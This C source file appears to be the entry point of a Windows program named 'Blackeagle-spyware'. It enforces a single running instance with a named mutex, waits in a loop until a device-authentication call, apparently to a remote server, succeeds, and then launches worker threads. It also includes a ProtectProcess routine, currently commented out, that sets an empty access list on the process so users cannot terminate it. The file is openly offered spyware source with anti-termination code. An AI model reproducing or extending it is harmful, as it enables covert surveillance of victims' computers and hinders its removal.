#include "Blackeagle-spyware.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	CreateMutexA(0, FALSE, "Local\\$blackeagle$"); // Try to create a named mutex
	if (GetLastError() == ERROR_ALREADY_EXISTS) // Does the mutex already exist?
		return -1; // quit; mutex is released automatically

	srand((unsigned)time(NULL) * getpid());
//	ProtectProcess();

  
	while (authenticateDevice().dwStatusCode != 200) {
		Sleep(SYNC_TIME);
	};
	 
	runThreads();
	return 0; 
}

// https://stackoverflow.com/questions/6185975/prevent-user-process-from-being-killed-with-end-process-from-process-explorer
DWORD ProtectProcess(void)
{
	HANDLE hProcess = GetCurrentProcess();
	PACL pEmptyDacl;
	DWORD dwErr;

	// using malloc guarantees proper alignment
	pEmptyDacl = (PACL)malloc(sizeof(ACL));

	if (!InitializeAcl(pEmptyDacl, sizeof(ACL), ACL_REVISION))
	{
		dwErr = GetLastError();
	}
	else
	{
		dwErr = SetSecurityInfo(hProcess, SE_KERNEL_OBJECT,
			DACL_SECURITY_INFORMATION, NULL, NULL, pEmptyDacl, NULL);
	}
	free(pEmptyDacl);
	return dwErr;
}
